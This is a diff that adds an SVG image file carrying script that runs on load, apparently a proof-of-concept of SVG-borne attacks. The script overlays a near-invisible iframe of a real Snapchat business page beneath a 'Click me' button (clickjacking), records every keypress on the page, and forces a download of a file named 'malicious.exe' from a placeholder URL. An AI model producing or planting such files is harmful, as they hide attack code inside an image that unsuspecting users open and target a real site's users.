@@ -1,0 +1,54 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="init()">
+  <script><![CDATA[
+    function init() {
+      clickjack();
+      keylogger();
+      driveByDownload();
+    }
+
+    function clickjack() {
+      var iframe = document.createElement('iframe');
+      iframe.style.width = '500px';
+      iframe.style.height = '500px';
+      iframe.style.opacity = '0.01';
+      iframe.style.position = 'absolute';
+      iframe.style.top = '50px';
+      iframe.style.left = '50px';
+      iframe.src = 'https://business.snapchat.com';
+      document.body.appendChild(iframe);
+      
+      var button = document.createElement('button');
+      button.innerHTML = 'Click me';
+      button.style.position = 'absolute';
+      button.style.top = '60px';
+      button.style.left = '60px';
+      button.style.zIndex = '10';
+      document.body.appendChild(button);
+    }
+
+    function keylogger() {
+      var log = '';
+      document.onkeypress = function(e) {
+        log += e.key;
+        document.getElementById('keylog').innerText = log;
+      };
+      var div = document.createElement('div');
+      div.id = 'keylog';
+      div.style.position = 'absolute';
+      div.style.top = '100px';
+      div.style.left = '50px';
+      div.style.backgroundColor = 'white';
+      div.style.padding = '10px';
+      document.body.appendChild(div);
+    }
+
+    function driveByDownload() {
+      var link = document.createElement('a');
+      link.href = 'https://example.com/malicious.exe'; // Zararlı dosyanın URL'si
+      link.download = 'malicious.exe';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  ]]></script>
+</svg>
